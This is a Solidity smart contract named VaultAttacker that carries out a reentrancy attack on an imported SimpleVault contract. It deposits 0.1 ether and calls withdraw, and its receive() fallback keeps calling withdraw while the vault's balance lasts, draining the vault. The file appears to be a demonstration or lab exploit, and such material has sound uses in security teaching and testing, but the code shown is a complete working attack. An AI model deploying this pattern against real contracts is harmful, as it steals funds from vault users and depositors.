pragma solidity ^0.8.20;

import {SimpleVault} from "./SimpleVault.sol";

contract VaultAttacker {
    SimpleVault public vault;
    uint256 public constant ATTACK_AMOUNT = 0.1 ether;

    constructor(address _vault) {
        vault = SimpleVault(_vault);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 0.1 ether");
        vault.deposit{value: ATTACK_AMOUNT}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= ATTACK_AMOUNT) {
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
